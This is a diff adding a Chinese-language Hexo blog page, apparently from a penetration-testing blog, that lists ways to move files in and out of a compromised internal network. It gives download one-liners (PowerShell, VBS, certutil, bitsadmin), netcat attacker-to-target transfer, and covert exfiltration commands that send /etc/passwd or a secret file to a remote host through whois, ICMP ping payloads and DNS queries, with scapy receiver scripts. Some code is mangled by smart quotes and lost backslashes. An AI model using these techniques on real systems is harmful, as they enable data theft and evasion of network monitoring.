@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>内网文件传输与下载 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="wput ```c#:wput dir_name ftp://linuxpig:123456@host.com/wget ```php:wget http://site.com/1.rar -O 1.rarariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网文件传输与下载">
+<meta property="og:url" content="http://yoursite.com/2020/03/05/内网文件传输与下载/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="wput ```c#:wput dir_name ftp://linuxpig:123456@host.com/wget ```php:wget http://site.com/1.rar -O 1.rarariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-03-05T04:04:06.654Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网文件传输与下载">
+<meta name="twitter:description" content="wput ```c#:wput dir_name ftp://linuxpig:123456@host.com/wget ```php:wget http://site.com/1.rar -O 1.rarariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+</head>
+</html>
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-内网文件传输与下载" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      内网文件传输与下载
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2020/03/05/内网文件传输与下载/" class="article-date">
+  <time datetime="2020-03-05T03:55:14.000Z" itemprop="datePublished">2020-03-05</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>wput</p>
+<p>```c#:wput dir_name <a href="ftp://linuxpig:123456@host.com/" target="_blank" rel="noopener">ftp://linuxpig:123456@host.com/</a><br>wget</p>
+<p>```php:wget <a href="http://site.com/1.rar" target="_blank" rel="noopener">http://site.com/1.rar</a> -O 1.rar<br>ariac2（需安装）</p>
+<p>aria2c -o owncloud.zip <a href="https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2" target="_blank" rel="noopener">https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</a><br>powershell</p>
+<p>$p = New-Object System.Net.WebClient<br>$p.DownloadFile(“<a href="http://domain/file&quot;,&quot;C:%homepath%file&quot;" target="_blank" rel="noopener">http://domain/file&quot;,&quot;C:%homepath%file&quot;</a>)<br>vbs脚本</p>
+<p>Set args = Wscript.Arguments<br>Url = “<a href="http://domain/file&quot;" target="_blank" rel="noopener">http://domain/file&quot;</a><br>dim xHttp: Set xHttp = createobject(“Microsoft.XMLHTTP”)<br>dim bStrm: Set bStrm = createobject(“Adodb.Stream”)<br>xHttp.Open “GET”, Url, False<br>xHttp.Send<br>with bStrm<br>.type = 1 ‘<br>.open<br>.write xHttp.responseBody<br>.savetofile “ C:%homepath%\file”, 2 ‘<br>end with<br>执行 ：cscript test.vbs</p>
+<p>Perl</p>
+<p>#!/usr/bin/perl<br>use LWP::Simple;<br>getstore(“<a href="http://domain/file&quot;" target="_blank" rel="noopener">http://domain/file&quot;</a>, “file”);<br>执行：perl test.pl</p>
+<p>Python</p>
+<p>#!/usr/bin/python<br>import urllib2<br>u = urllib2.urlopen(‘<a href="http://domain/file&#39;" target="_blank" rel="noopener">http://domain/file&#39;</a>)<br>localFile = open(‘local_file’, ‘w’)<br>localFile.write(u.read())<br>localFile.close()<br>执行：python test.py</p>
+<p>Ruby</p>
+<p>#!/usr/bin/ruby<br>require ‘net/http’<br>Net::HTTP.start(“<a href="http://www.domain.com&quot;" target="_blank" rel="noopener">www.domain.com&quot;</a>) { |http|<br>r = http.get(“/file”)<br>open(“save_location”, “wb”) { |file|<br>file.write(r.body)<br>}<br>}<br>执行：ruby test.rb</p>
+<p>PHP</p>
+<?php
+$url  = 'http://www.example.com/file';
+$path = '/path/to/file';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$data = curl_exec($ch);
+curl_close($ch);
+file_put_contents($path, $data);
+?>
+<p>执行：php test.php</p>
+<p>NC attacker</p>
+<p>cat file | nc -l 1234<br>target</p>
+<p>nc host_ip 1234 &gt; file<br>FTP</p>
+<p>ftp 127.0.0.1 username password get file exit<br>TFTP</p>
+<p>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server<br>Bitsadmin</p>
+<p>bitsadmin /transfer n <a href="http://domain/file" target="_blank" rel="noopener">http://domain/file</a> c:%homepath%file<br>Window 文件共享</p>
+<p>net use x: \127.0.0.1\share /user:example.comuserID myPassword<br>SCP 本地到远程</p>
+<p>scp file <a href="mailto:user@host.com" target="_blank" rel="noopener">user@host.com</a>:/tmp<br>远程到本地</p>
+<p>scp <a href="mailto:user@host.com" target="_blank" rel="noopener">user@host.com</a>:/tmp file<br>rsync 远程rsync服务器中拷贝文件到本地机</p>
+<p>rsync -av <a href="mailto:root@192.168.78.192" target="_blank" rel="noopener">root@192.168.78.192</a>::www /databack<br>本地机器拷贝文件到远程rsync服务器</p>
+<p>rsync -av /databack <a href="mailto:root@192.168.78.192" target="_blank" rel="noopener">root@192.168.78.192</a>::www<br>certutil.exe</p>
+<p>certutil.exe -urlcache -split -f <a href="http://site.com/file" target="_blank" rel="noopener">http://site.com/file</a><br>copy</p>
+<p>copy \IP\ShareName\file.exe file.exe<br>WHOIS 接收端 Host B：</p>
+<p>nc -vlnp 1337 | sed “s/ //g” | base64 -d<br>发送端 Host A：</p>
+<p>whois -h host_ip -p 1337 <code>cat /etc/passwd | base64</code><br>WHOIS + TAR First:</p>
+<p>ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it<br>Next</p>
+<p>tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits<br>Finally</p>
+<p>cat files.b64 | tr -d ‘\r\n’ | base64 -d | tar zxv #to get the files out<br>PING 发送端:</p>
+<p>xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done<br>接收端ping_receiver.py:</p>
+<p>import sys</p>
+<p>try:<br>    from scapy.all import *<br>except:<br>    print(“Scapy not found, please install scapy: pip install scapy”)<br>    sys.exit(0)</p>
+<p>def process_packet(pkt):<br>    if pkt.haslayer(ICMP):<br>        if pkt[ICMP].type == 8:<br>            data = pkt[ICMP].load[-4:]<br>            print(f’{data.decode(“utf-8”)}’, flush=True, end=””, sep=””)</p>
+<p>sniff(iface=”eth0”, prn=process_packet)<br>python3 ping_receiver.py<br>DIG 发送端:</p>
+<p>xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done<br>接收端dns_reciver.py:</p>
+<p>try:<br>    from scapy.all import *<br>except:<br>    print(“Scapy not found, please install scapy: pip install scapy”)</p>
+<p>def process_packet(pkt):<br>    if pkt.haslayer(DNS):<br>        domain = pkt[DNS][DNSQR].qname.decode(‘utf-8’)<br>        root_domain = domain.split(‘.’)[1]<br>        if root_domain.startswith(‘gooogle’):<br>            print(f’{bytearray.fromhex(domain[:-13]).decode(“utf-8”)}’, flush=True, end=’’)</p>
+<p>sniff(iface=”eth0”, prn=process_packet)<br>python3 dns_reciver.py</p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2019/12/09/Apache Flink任意jar包上传导致远程代码执行/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Apache Flink任意jar包上传导致远程代码执行</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        柚子味的风
+      
+    </h3>
+    <p class="avatar-slogan">
+      know it then hack it
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/05/内网文件传输与下载/">内网文件传输与下载</a>
+          </li>
+        
+          <li>
+            <a href="/2019/12/09/Apache Flink任意jar包上传导致远程代码执行/">Apache Flink任意jar包上传导致远程代码执行</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/12/通过jboss反弹shell/">通过jboss反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/11/使用cmd开启3389端口的方法/">使用cmd开启3389端口的方法</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/27/cs的使用教程/">powershell反弹shell</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="http://richardtang.funnysec.com" title target='_blank'
+        >RichardTang</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2020 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
